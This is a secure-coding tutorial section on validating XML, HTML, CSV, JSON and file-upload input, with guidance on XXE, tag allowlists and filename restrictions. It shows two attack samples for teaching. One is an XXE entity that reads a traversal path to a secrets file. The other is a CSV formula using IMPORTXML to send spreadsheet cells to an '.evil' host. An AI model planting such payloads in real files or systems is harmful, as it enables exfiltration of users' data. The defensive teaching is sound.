### Input Data Structures (XML, HTML, CSV, JSON, & File Uploads)

Of course, sometimes a program needs to accept common complex data structures, such as XML, HTML, JSON, and CSV. Since these are common formats, it is worth talking about them specifically.

While technically these are strings, in reality these are strings with their own more complex internal structure. It is often best to use libraries specifically designed to handle these input formats, as long as they are designed to handle potentially-malicious inputs. You should typically try to identify and reject data structures that are not syntactically valid, and then, where appropriate, check that they meet whatever specific schema they are supposed to meet. Ideally, these libraries will let you specify only what you want to accept, and reject everything else. If those mechanisms cannot fully validate the input, then supplement that with whatever input validation you need to ensure that only valid data is accepted.

#### XML

Lots of data and messages are encoded in XML (Extensible Markup Language). XML is part of other formats, such as SOAP (Simple Object Access Protocol). There are two terms about XML that are widely confused:

* **Well-formed**
Well-formed XML follows certain syntax rules. For example, all opened tags must be closed, and XML elements must be properly nested. If you are accepting XML, at *least* verify that the XML is well-formed; there are easily-available libraries for this, and applications are only supposed to accept XML that is well-formed.

* **Valid**
Valid XML meets some schema definition. The schema specifies information such as *what* tags are allowed, how they may be nested, and whether some are required. A schema definition, if rigorous, is a kind of allowlist. Thus, checking for validity before accepting XML input can be really useful for countering attacks. However, do *not* allow the attacker to determine what schema to use - decide what schema is okay and use *that*. Sometimes no schema is available, though, and if you are only extracting a small part of XML, it may not be worth it to create an XML schema.

If you are using XML, there is an extremely common vulnerability you need to counter called XML External Entities (XXE). To understand them, you need to understand some XML functionality that is not widely known.

XML supports external references which can be auto-loaded when the original document is loaded. The external reference can be any file location or URL. This means an attacker can provide files that quietly cause other files or URLs to be loaded and placed in certain places. This functionality exists for a reason, and some systems legitimately depend on it. However, many developers have no idea that this is possible, and this has led to many vulnerabilities. Here is an example of an XML document with embedded external entities:

~~~~xml
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
     "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

    <!DOCTYPE letter [

      <!ENTITY part1 SYSTEM "http://www.example.com/part1.xml">

      <!ENTITY part2 SYSTEM "../../../secrets/part2.xml"> ]> ...

    <building>

    &part1; &part2;

    </building>
~~~~

In general, you should not accept unchecked external references from untrusted sources. Here are a few possible solutions:

* Configure your XML reader/processor to ignore or reject external references. Make sure to check, in your automated tests, that it is still being ignored! Since most applications don’t use external entities, this is typically the easiest solution.

* Forbid or check (with an allowlist) any external reference before use.

* Don’t use XML, including formats like SOAP that use XML. Other formats, like JSON, don’t have this mechanism and thus cannot have this problem.

For more about this issue, see the [OWASP XML External Entities web page](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html).

XML XXE is such a common mistake in web applications that it is 2017 OWASP Top 10 #4 and 2019 CWE Top 25 #17. It is also identified as [CWE-611](https://cwe.mitre.org/data/definitions/611.html), *Improper Restriction of XML External Entity Reference*.

#### HTML

Typically you can simply call a library to validate HTML and pass a set of allowed tags (e.g,. **&lt;p&gt;**) and attributes (e.g., **href=**). Everything not permitted is removed or rejected. This will eliminate dangerous tags like **&lt;script&gt;** from external sources (presuming that you don’t include dangerous tags in the set of allowed tags).

Although this is potentially a big topic, in practice, the key is often to use a library with decent secure defaults. If you only allow tags such as **&lt;p&gt;**, **&lt;i&gt;**, and **&lt;b&gt;**, and limit attributes to values such as **id**, the amount of damage that can be done is greatly limited.

#### CSV

The “comma separated value” (CSV) format is in theory simple. Every line is a record, where fields are separated by commas. The first line is usually a “header line” - the field names separated by commas (you should always provide the header, since this makes the CSV file more extensible and much easier to handle with other tools).

In practice, there is a lot of variation in CSV formats. However, for security, the *bigger* problem is that some tools (such as Microsoft Excel and LibreOffice) will *execute* certain constructs when they read CSV, even if CSV looks like a data-only format. For example, a field value beginning with “**=**” is interpreted as “*execute these functions*”, and functions can access external data. In some spreadsheet implementations, the field contents “**=IMPORTXML(CONCAT(“"http://some-server-with-log.evil?v="”, CONCATENATE(A2:E2)), “"//a"”)**” will *send* data from the spreadsheet to an external site. The solution, as always, is to validate each field value before accepting it. Especially problematic values are those beginning with **=**, **+**, **-**, and **@**.

When reading these formats from an untrusted source, ensure that each cell meets the expected data format, and don’t pass on the data otherwise. Be especially wary of cells beginning with “**=**”, and try to avoid passing them on, since some tools may execute their contents.

#### JSON

JSON does not have the built-in capability to record external entities or expressions that many tools would expect to be executed, which makes it an advantage from a security point-of-view. There are tools that can easily validate JSON syntax, often implemented as part of reading JSON into a useful internal format.

If you want to go further, there are formats such as JSON Schema that let you define with more rigor exactly the format of a given JSON format. Then you can use JSON Schema validators to verify that the data matches the schema.

#### File uploads

Sometimes you need to accept file uploads of special file types (e.g., of images).

If your program allows uploads, try to limit uploads to specific file types and make sure (via both its MIME type and its contents) that it is one of the valid types that you will accept. Limit what you allow in the filename, too; alphanumeric characters are generally fine, but anything else (especially “**/**” and “**&#92;**”) can be problematic, so only allow the characters you are certain will be fine. Where possible, define an acceptlist of allowed filename suffixes, and only allow uploads of files named with one of those allowed suffixes.

Inadequate restriction of uploads is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #16. It is identified as [CWE-434](https://cwe.mitre.org/data/definitions/434.html), *Unrestricted Upload of File with Dangerous Type*.